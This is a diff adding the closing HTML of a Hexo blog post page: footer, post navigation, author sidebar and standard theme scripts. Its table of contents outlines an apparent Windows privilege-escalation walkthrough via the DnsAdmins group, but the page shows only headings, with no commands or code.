+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/dnsadmins/" rel="tag"># dnsadmins</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/06/07/windows-privilege-escalate-DnsAdmins-Group/" rel="next" title="windows privilege escalate: DnsAdmins Group">
+                <i class="fa fa-chevron-left"></i> windows privilege escalate: DnsAdmins Group
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/06/16/Linux提权之PATH环境变量/" rel="prev" title="Linux提权之PATH环境变量(译文)">
+                Linux提权之PATH环境变量(译文) <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">owefsad</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">81</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">164</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/exexute" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:owefsad@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#信息收集"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取melanie用户"><span class="nav-number">2.</span> <span class="nav-text">获取melanie用户</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#melanie-to-ryan"><span class="nav-number">3.</span> <span class="nav-text">melanie to ryan</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ryan-to-system"><span class="nav-number">4.</span> <span class="nav-text">ryan to system</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#用户组dnsadmins提权"><span class="nav-number">5.</span> <span class="nav-text">用户组dnsadmins提权</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#nc收到system权限的shell"><span class="nav-number">5.1.</span> <span class="nav-text">nc收到system权限的shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#拿到root权限"><span class="nav-number">5.2.</span> <span class="nav-text">拿到root权限</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考文章"><span class="nav-number">6.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">owefsad</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
